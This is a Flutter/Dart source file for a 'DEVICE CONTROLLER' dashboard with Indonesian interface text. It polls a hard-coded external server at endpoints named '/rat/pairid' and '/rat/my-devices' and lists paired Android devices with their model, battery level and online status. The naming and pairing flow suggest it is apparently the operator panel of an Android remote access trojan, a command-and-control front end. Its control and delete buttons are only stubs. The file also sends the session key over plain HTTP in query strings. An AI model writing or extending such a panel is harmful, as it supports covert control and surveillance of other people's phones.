// device_dashboard.dart - FIXED VERSION
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:convert';
import 'dart:async';
import 'package:http/http.dart' as http;

const String _kBase = 'http://draoffice.danzxnhosting.my.id:11860';

class DeviceDashboard extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  
  const DeviceDashboard({
    super.key,
    this.username = '',
    this.role = '',
    required this.sessionKey,
  });
  
  @override
  State<DeviceDashboard> createState() => _DeviceDashboardState();
}

class _DeviceDashboardState extends State<DeviceDashboard> {
  static const Color _bgDark = Color(0xFF030712);
  static const Color _cardBg = Color(0xFF0D1424);
  static const Color _cardBorder = Color(0xFF1A263F);
  static const Color _accentCyan = Color(0xFF06B6D4);
  static const Color _accentBlue = Color(0xFF3B82F6);
  static const Color _accentEmerald = Color(0xFF10B981);
  static const Color _accentRose = Color(0xFFF43F5E);
  static const Color _textSecondary = Color(0xFF94A3B8);
  
  List<dynamic> _devices = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _timer;
  
  @override
  void initState() {
    super.initState();
    _loadDevices();
    _timer = Timer.periodic(const Duration(seconds: 15), (_) => _loadDevices());
  }
  
  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }
  
  Future<void> _loadDevices() async {
    setState(() {
      _loading = true;
      _errorMsg = null;
    });
    
    try {
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
          
      if (pRes.statusCode == 200 && mounted) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          setState(() => _pairId = pd['pairId'].toString());
        }
      }
      
      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));
          
      if (!mounted) return;
      
      if (dRes.statusCode != 200) {
        setState(() {
          _loading = false;
          _errorMsg = 'Server error: ${dRes.statusCode}';
        });
        return;
      }
      
      final body = jsonDecode(dRes.body);
      
      if (body['valid'] != true) {
        setState(() {
          _loading = false;
          _errorMsg = body['message'] ?? 'Invalid response';
        });
        return;
      }
      
      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
      }
      
      setState(() {
        _devices = devices;
        _loading = false;
        if (devices.isEmpty) {
          _errorMsg = 'Belum ada device yang terhubung';
        }
      });
      
    } catch (e) {
      if (mounted) {
        setState(() {
          _loading = false;
          _errorMsg = 'Koneksi terputus: ${e.toString()}';
        });
      }
    }
  }
  
  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Pair ID disalin'), duration: Duration(seconds: 2)),
    );
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgDark,
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.topCenter,
            radius: 1.5,
            colors: [const Color(0xFF1E293B), _bgDark],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    children: [
                      _buildStatsCard(),
                      const SizedBox(height: 16),
                      if (_pairId.isNotEmpty) _buildPairIdCard(),
                      const SizedBox(height: 16),
                      if (_errorMsg != null) _buildErrorBanner(),
                      if (_loading)
                        const Center(
                          child: Padding(
                            padding: EdgeInsets.all(32),
                            child: CircularProgressIndicator(color: Color(0xFF06B6D4)),
                          ),
                        )
                      else if (_devices.isEmpty)
                        _buildEmptyState()
                      else
                        ..._devices.map((device) => _buildDeviceCard(device)),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
  
  Widget _buildHeader() {
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
      decoration: BoxDecoration(
        color: _cardBg.withOpacity(0.8),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _cardBorder),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [Color(0xFF06B6D4), Color(0xFF3B82F6)]),
              borderRadius: BorderRadius.circular(12),
            ),
            child: const Icon(Icons.devices, color: Colors.black, size: 20),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('DEVICE CONTROLLER', style: TextStyle(color: Color(0xFF94A3B8), fontSize: 10)),
                Text(widget.role.toUpperCase(), style: const TextStyle(color: Color(0xFF06B6D4), fontSize: 12)),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: _accentEmerald.withOpacity(0.1),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: _accentEmerald.withOpacity(0.3)),
            ),
            child: const Row(
              children: [
                Icon(Icons.wifi, color: _accentEmerald, size: 12),
                SizedBox(width: 6),
                Text('Sistem Aktif', style: TextStyle(fontSize: 10)),
              ],
            ),
          ),
        ],
      ),
    );
  }
  
  Widget _buildStatsCard() {
    int online = _devices.where((d) => d['online'] == true).length;
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _cardBg.withOpacity(0.6),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _cardBorder),
      ),
      child: Row(
        children: [
          _buildStat('TOTAL', _devices.length.toString(), _accentCyan),
          const SizedBox(width: 12),
          _buildStat('ONLINE', online.toString(), _accentEmerald),
          const SizedBox(width: 12),
          _buildStat('OFFLINE', (_devices.length - online).toString(), _accentRose),
        ],
      ),
    );
  }
  
  Widget _buildStat(String label, String value, Color color) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [color.withOpacity(0.15), color.withOpacity(0.05)]),
          borderRadius: BorderRadius.circular(12),
        ),
        child: Column(
          children: [
            Text(label, style: TextStyle(color: _textSecondary, fontSize: 10)),
            const SizedBox(height: 4),
            Text(value, style: TextStyle(color: color, fontSize: 24, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }
  
  Widget _buildPairIdCard() {
    return GestureDetector(
      onTap: _copyPairId,
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [_accentBlue.withOpacity(0.15), _accentBlue.withOpacity(0.05)]),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: _accentBlue.withOpacity(0.3)),
        ),
        child: Row(
          children: [
            Icon(Icons.link, color: _accentCyan),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text('PAIRING ID', style: TextStyle(color: Color(0xFF94A3B8), fontSize: 9)),
                  Text(_pairId, style: TextStyle(color: _accentCyan, fontFamily: 'monospace')),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
              decoration: BoxDecoration(
                color: _accentCyan.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8),
              ),
              child: const Row(
                children: [
                  Icon(Icons.copy, color: _accentCyan, size: 14),
                  SizedBox(width: 4),
                  Text('SALIN', style: TextStyle(fontSize: 9)),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
  
  Widget _buildErrorBanner() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _accentRose.withOpacity(0.1),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _accentRose.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Icon(Icons.error_outline, color: _accentRose, size: 18),
          const SizedBox(width: 12),
          Expanded(child: Text(_errorMsg!, style: TextStyle(color: _accentRose, fontSize: 11))),
        ],
      ),
    );
  }
  
  Widget _buildEmptyState() {
    return Container(
      padding: const EdgeInsets.all(40),
      decoration: BoxDecoration(
        color: _cardBg.withOpacity(0.4),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: _cardBorder),
      ),
      child: Column(
        children: [
          Icon(Icons.devices, color: _textSecondary, size: 64), // Ganti devices_off jadi devices
          const SizedBox(height: 16),
          const Text('BELUM ADA DEVICE', style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold)),
          const SizedBox(height: 8),
          const Text('Gunakan Pair ID untuk menghubungkan device Android', style: TextStyle(fontSize: 11)),
        ],
      ),
    );
  }
  
  Widget _buildDeviceCard(Map<String, dynamic> device) {
    final bool isOnline = device['online'] == true;
    final String deviceName = device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;
    
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: _cardBg,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: isOnline ? _accentCyan.withOpacity(0.3) : _cardBorder),
      ),
      child: ListTile(
        contentPadding: const EdgeInsets.all(16),
        leading: Stack(
          children: [
            Container(
              width: 56, height: 56,
              decoration: BoxDecoration(
                color: const Color(0xFF0E172A),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _cardBorder),
              ),
              child: Icon(Icons.phone_android, color: isOnline ? _accentBlue : _textSecondary, size: 28),
            ),
            Positioned(
              bottom: 4, right: 4,
              child: Container(
                width: 10, height: 10,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: isOnline ? _accentEmerald : _accentRose,
                ),
              ),
            ),
          ],
        ),
        title: Text(deviceName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
        subtitle: Row(
          children: [
            Icon(Icons.battery_charging_full, color: _textSecondary, size: 12),
            const SizedBox(width: 4),
            Text('$battery%', style: TextStyle(color: _textSecondary, fontSize: 11)),
            const SizedBox(width: 12),
            Container(width: 6, height: 6, decoration: BoxDecoration(shape: BoxShape.circle, color: isOnline ? _accentEmerald : _accentRose)),
            const SizedBox(width: 6),
            Text(isOnline ? 'Online' : 'Offline', style: TextStyle(color: isOnline ? _accentEmerald : _accentRose, fontSize: 11)),
          ],
        ),
        trailing: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            IconButton(
              icon: Icon(Icons.tune, color: _accentBlue),
              onPressed: () => ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(content: Text('Control panel coming soon')),
              ),
            ),
            IconButton(
              icon: Icon(Icons.delete, color: _accentRose),
              onPressed: () => ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(content: Text('Delete device coming soon')),
              ),
            ),
          ],
        ),
      ),
    );
  }
}